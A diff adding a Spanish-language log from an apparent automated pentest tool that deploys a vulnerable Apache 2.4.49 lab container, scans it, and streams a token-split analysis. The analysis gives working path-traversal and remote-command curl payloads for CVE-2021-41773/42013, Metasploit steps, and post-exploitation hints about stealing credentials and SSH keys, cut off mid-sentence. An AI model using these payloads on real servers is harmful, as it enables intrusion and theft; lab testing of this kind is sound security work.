@@ -1,0 +1,755 @@
+=== Port Sweep ===
+Target: N/A
+Herramientas: nmap, docker
+
+--- Resultados ---
+[Desplegar entorno vulnerable]
+Desplegando contenedor 'ares_deploy_6a314c2b' desde imagen vulhub/httpd:2.4.49...
+bd2cf05b60b276f80f554c2ddc1e1fe16b7e435ff0c16dbbf6bb5034273b7f41
+Contenedor activo en 127.0.0.1:32772
+
+
+[Verificar conectividad]
+Verificando conectividad TCP contra 127.0.0.1:32772...
+Conectividad confirmada.
+
+
+[Escaneo Nmap]
+Ejecutando: nmap -sV -p 32772 127.0.0.1
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-07-10 19:31 Hora estándar central (México)
+Nmap scan report for kubernetes.docker.internal (127.0.0.1)
+Host is up (0.00s latency).
+
+PORT      STATE SERVICE VERSION
+32772/tcp open  http    Apache httpd 2.4.49 ((Unix))
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.81 seconds
+
+
+[Análisis ARES]
+ARES está analizando los resultados...
+**
+An
+ál
+isis
+ de
+ resultados
+:**
+  
+
+El
+ esc
+ane
+o
+ revel
+a
+ un
+ serv
+idor
+ Apache
+ HTTP
+D
+ 
+2
+.
+4
+.
+49
+ corri
+endo
+ en
+ el
+ pu
+erto
+ 
+327
+72
+ (
+127
+.
+0
+.
+0.
+1
+).
+ Esta
+ vers
+ión
+ es
+ vulnerable
+ a
+ **
+C
+VE
+-
+202
+1
+-
+417
+73
+**
+ (
+path
+ traversal
+ y
+ ejec
+ución
+ rem
+ota
+ de
+ comand
+os
+)
+ y
+ **
+C
+VE
+-
+2021
+-
+420
+13
+**
+ (
+by
+pass
+ del
+ par
+che
+ anterior
+,
+ permit
+iendo
+ path
+ traversal
+ y
+ R
+CE
+).
+ D
+ado
+ que
+ el
+ servicio está exp
+uesto
+ local
+mente
+,
+ es
+ probable
+ que
+ se
+ tr
+ate
+ de
+ un
+ entorno
+ de
+ pruebas
+ o
+ cont
+ened
+or
+ (
+por
+ el
+ nombre
+ `
+ku
+bernetes
+.d
+ocker
+.internal
+`
+).
+  
+
+
+**
+Pr
+ó
+xim
+os
+ pas
+os
+ de
+ expl
+ot
+ación
+ (
+ent
+orno
+ autor
+izado
+):
+**
+  
+
+
+1
+.
+ **
+Ver
+ificar
+ vulner
+abilidad
+ C
+VE
+-
+202
+1
+-
+417
+73
+ (
+path
+ traversal
+ bás
+ico
+):
+**
+  
+
+  
+ ```
+bash
+
+
+  
+ curl -
+v
+ --
+path
+-as
+-is
+ "
+http
+://
+127
+.
+0
+.
+0
+.
+1
+:
+327
+72
+/c
+gi
+-bin
+/.
+%
+2
+e
+/%
+2
+e
+%
+2
+e
+/%
+2
+e
+%
+2
+e
+/%
+2
+e
+%
+2
+e
+/etc
+/p
+ass
+wd
+"
+
+  
+ ```
+  
+
+  
+ Si
+ resp
+onde
+ con
+ contenido
+ de
+ `/
+etc
+/p
+ass
+wd
+`,
+ la
+ vulner
+abilidad
+ es
+ expl
+ot
+able
+.
+
+
+2
+.
+ **
+Probar
+ C
+VE
+-
+202
+1
+-
+420
+13
+ (
+by
+pass
+ con
+ do
+ble
+ cod
+ificación
+):
+**
+  
+
+  
+ ```
+bash
+
+
+  
+ curl
+ -
+v
+ --
+path
+-as
+-is
+ "
+http
+://
+127
+.
+0
+.
+0
+.
+1
+:
+327
+72/c
+gi
+-bin
+/.
+%%
+32
+%
+65
+/.
+%%
+32
+%
+65
+/.
+%%
+32%
+65
+/.
+%%
+32
+%
+65
+/etc
+/p
+ass
+wd
+"
+
+  
+ ```
+  
+
+  
+ Altern
+ativamente
+,
+ usar
+ `
+%
+252
+e
+`
+ para
+ do
+ble
+ cod
+ificación
+.
+
+
+3
+.
+ **
+Ej
+ec
+ución
+ rem
+ota
+ de
+ comand
+os
+ (
+RCE
+)
+ si
+ el
+ mód
+ulo
+ `
+mod
+_c
+gi
+`
+ está
+ hab
+ilit
+ado
+:**
+  
+
+  
+ ```
+bash
+
+
+  
+ curl
+ -
+v
+ --
+data
+ "
+echo
+;
+id
+"
+ "
+http
+://
+127
+.
+0
+.
+0
+.
+1
+:
+32772/c
+gi
+-bin
+/.
+%
+2
+e
+/%
+2
+e
+%
+2
+e
+/%
+2
+e
+%
+2
+e
+/%
+2
+e
+%
+2
+e
+/bin
+/sh
+"
+
+  
+ ```
+  
+
+  
+ O
+ mediante
+ el
+ script
+ de
+ Met
+as
+ploit
+:
+  
+
+  
+ ```
+bash
+
+
+  
+ ms
+f
+console
+
+
+  
+ use
+ exploit
+/m
+ulti
+/http
+/ap
+ache
+_normal
+ize
+_path
+_r
+ce
+
+
+  
+ set
+ RH
+OST
+S
+ 
+127
+.
+0
+.
+0
+.
+1
+
+
+  
+ set
+ RP
+ORT
+ 
+327
+72
+
+
+  
+ set
+ T
+ARGET
+URI
+ /
+c
+gi
+-bin
+/.
+%
+2
+e
+/%
+2
+e
+%
+2
+e
+/%
+2
+e
+%
+2
+e
+/%
+2
+e
+%
+2
+e
+/bin
+/sh
+
+
+  
+ run
+
+
+  
+ ```
+
+
+4
+.
+ **
+En
+umer
+ación
+ adicional
+:**
+  
+
+  
+ -
+ Esc
+an
+ear
+ otros
+ pu
+ertos
+ (
+pos
+ibles
+ servicios
+ intern
+os
+ exp
+uestos
+).
+  
+
+  
+ -
+ Us
+ar
+ `
+n
+map
+ --
+script
+ http
+-v
+ul
+n
+-c
+ve
+202
+1
+-
+417
+73
+,
+http
+-v
+ul
+n
+-cve
+202
+1
+-
+420
+13
+ -
+p
+ 
+327
+72
+ 
+127
+.
+0
+.
+0
+.
+1
+`.
+  
+
+  
+ -
+ Re
+vis
+ar
+ si
+ hay
+ otros
+ endpoints
+ o
+ director
+ios
+ sens
+ibles
+ (
+`.
+ht
+access
+`,
+ config
+u
+raciones
+ de
+ Apache
+).
+
+
+5
+.
+ **
+Post
+-ex
+plot
+aci
+ón
+ (
+si
+ se
+ obt
+iene
+ acceso
+):
+**
+  
+
+  
+ -
+ Esc
+alar
+ privile
+g
+ios (
+pos
+ible
+ cont
+ened
+or
+ con
+ privile
+g
+ios
+).
+  
+
+  
+ -
+ Extra
+er
+ cred
+encial
+es
+,
+ cl
+aves
+ SSH
+,
+
+
+[Destruir entorno]
+Deteniendo y eliminando contenedor 'ares_deploy_6a314c2b'...
+ares_deploy_6a314c2b
+Entorno limpiado correctamente.
+
+
+
+--- Análisis ARES ---
+Deteniendo y eliminando contenedor 'ares_deploy_6a314c2b'...
+ares_deploy_6a314c2b
+Entorno limpiado correctamente.
